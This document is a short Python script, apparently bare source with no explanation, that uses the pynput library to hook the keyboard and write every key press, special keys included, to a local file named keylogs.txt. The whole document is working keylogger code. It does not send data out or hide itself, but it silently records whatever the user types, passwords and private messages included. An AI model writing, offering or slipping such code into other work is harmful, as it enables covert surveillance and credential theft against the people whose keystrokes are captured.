from pynput.keyboard import Listener

log_file = "keylogs.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")  # Log key presses
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" {key} ")  # Log special keys (e.g., Enter, Shift)

def main():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()